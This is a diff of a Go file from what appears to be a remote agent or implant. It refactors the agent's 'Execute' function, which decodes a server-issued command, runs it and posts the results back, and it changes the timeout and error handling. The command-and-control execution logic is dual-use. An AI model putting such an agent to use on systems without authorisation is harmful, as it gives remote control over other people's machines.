@@ -1,6 +1,8 @@
 package api
 
 import (
+	"../execute"
+	"../util"
 	"bytes"
 	"encoding/json"
 	"fmt"
@@ -9,12 +11,9 @@ import (
 	"net/http"
 	"os"
 	"path/filepath"
+	"reflect"
 	"runtime"
 	"strings"
-	"time"
-
-	"../execute"
-	"../util"
 )
 
 const (
@@ -64,23 +63,20 @@ func Drop(server string, payload string) {
 // Execute executes a command and posts results
 func Execute(profile map[string]interface{}, command map[string]interface{}) {
 	timeoutChan := make(chan bool, 1)
-	resultChan := make(chan []byte, 1)
-	errorChan := make(chan bool, 1)
+	resultChan := make(chan map[string]interface{}, 1)
 	cmd := string(util.Decode(command["command"].(string)))
 	status := "0"
 	var result []byte
-	go func() {
-		time.Sleep(TIMEOUT * time.Second)
-		timeoutChan <- true
-	}()
-	go execute.Execute(cmd, command["executor"].(string), resultChan, errorChan)
+	go util.TimeoutWatchdog(timeoutChan, TIMEOUT)
+	go execute.Execute(cmd, command["executor"].(string), resultChan)
 loop:
 	for {
 		select {
-		case <-errorChan:
-			status = "1"
 		case data := <-resultChan:
-			result = data
+			result = reflect.ValueOf(data["result"]).Bytes()
+			if reflect.ValueOf(data["err"]).IsValid() {
+				status = "1"
+			}
 			break loop
 		case <-timeoutChan:
 			result = []byte("Command execution timed out.")
